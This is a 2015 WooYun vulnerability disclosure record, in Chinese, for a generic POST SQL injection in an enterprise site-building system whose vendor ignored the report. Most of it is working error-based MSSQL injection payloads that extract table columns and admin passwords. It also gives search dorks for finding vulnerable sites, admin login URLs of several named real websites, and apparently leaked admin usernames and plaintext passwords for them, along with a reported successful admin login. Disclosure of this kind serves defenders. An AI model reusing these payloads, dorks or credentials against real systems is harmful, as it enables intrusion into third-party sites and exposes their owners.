{"id": 39056, "wybug_id": "wooyun-2015-094868", "wybug_title": "某企业建站系统通用型POST注入", "wybug_corp": "苏州天颂计算机技术服务有限公司", "wybug_author": "0x 80", "wybug_date": "2015-02-05 10:46", "wybug_open_date": "2015-03-22 10:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 通用型POST注入 详细说明：  三种方式能搜索到，影响部分企业公司网站百度：本站由站务通提供动力支持   \n\n  Powered by useshow.谷歌：本站由站务通提供动力支持     Powered by useshow.本想用BURP的，算了，就用手工，准确点\n\n\n\n=====================================\n\n   漏洞证明：  开始案例，存在的案例还是很多的。小部分不能POST\n\n1，先拿他做个试验站务通代理平台\n\nhttp://agent.useshow.com/输入：\n' having 1=1--\n \n' having 1=1--\n\n\n\n\n这么多表名出来了列 'member_message.id' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。列 'member_message.mlogin' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。列 'member_message.mpwd' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。列 'member_message.mpurview' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。列 'member_message.mdefaultpwd' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。列 'member_message.ex' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。列 'member_message.dotime' 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。========================================我就拿1个案例来演示下http://www.ahfdyy.com/ConstructASP/Admin/Login.aspx表几乎都是一样的。  ，我测试过表名：vip_userInfo字段：password\n1' and 1=convert(int,(select top 1 col_name(object_id ('vip_userInfo'),1) from vip_userInfo)) and '1'='1\n将 nvarchar 值 'id' 转换为数据类型为 int 的列时发生语法错误。\n1' and 1=convert(int,(select top 1 col_name(object_id ('vip_userInfo'),2) from vip_userInfo)) and '1'='1\n将 nvarchar 值 'vipCode' 转换为数据类型为 int 的列时发生语法错误。1' and 1=convert(int,(select top 1 col_name(object_id ('vip_userInfo'),3) from vip_userInfo)) and '1'='1将 nvarchar 值 'nickname' 转换为数据类型为 int 的列时发生语法错误爆密码：' and (select top 1 vip_userInfo.password from vip_userInfo)>0--\n\n' and (select top 1 vip_userInfo.nickname from vip_userInfo)>0--将 nvarchar 值 '管理员' 转换为数据类型为 int 的列时发生语法错误。' and (select top 1 vip_userInfo.vipcode from vip_userInfo)>0--将 varchar 值 'ahfdyycom' 转换为数据类型为 int 的列时发生语法错误。用户名ahfdyycom密码fdyy888登录看看，。看看对不\n\n进去了。。成功登录\n\n管理员权限。再贴几个可以POST的，具体就不一一测试了知道了这些细节，直接对登录口，就可以测试了直接输入爆用户，密码的语句经过试验爆通用的用户：' and (select top 1 vip_userInfo.vipcode from vip_userInfo)>0--爆通用的密码：' and (select top 1 vip_userInfo.password from vip_userInfo)>0--查看密码即可存在POST注入的站：http://www.sz-wb.com/ConstructASP/Admin/Login.aspx用户：szwbcom密码：gsw0612ljn102380\n\n====================================================http://www.ahhssm.com/ConstructASP/Admin/Login.aspx用户：ahhssmcom密码；HS110528\n\n===================================================http://www.wuhutw.com/ConstructASP/Admin/Login.aspx\n\n用户：将 varchar 值 'wuhutwcom' 转换为数据类型为 int 的列时发生语法错误。密码：将 varchar 值 'tw0377' 转换为数据类型为 int 的列时发生语法错误。\n\n============================================http://handfoot120.com/ConstructASP/Admin/Login.aspx用户：将 varchar 值 'handfoot120com' 转换为数据类型为 int 的列时发生语法错误。将 varchar 值 'a18907028210' 转换为数据类型为 int 的列时发生语法错误。\n\n================================================\nhttp://www.hfzksy.com/ConstructASP/Admin/Login.aspx\n用户将 varchar 值 'hfzksycom' 转换为数据类型为 int 的列时发生语法错误。密码：将 varchar 值 'allan1416' 转换为数据类型为 int 的列时发生语法错误。\n\n=============================================http://www.nssold.com/ConstructASP/Admin/Login.aspx将 varchar 值 'nssoldcom' 转换为数据类型为 int 的列时发生语法错误。varchar 值 '15055310566' 的转换溢出了 int 列。超出了最大整数值。\n\n============================================就不一一测试了！！！   修复方案：  修复注入参数   版权声明：转载请注明来源 0x 80@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}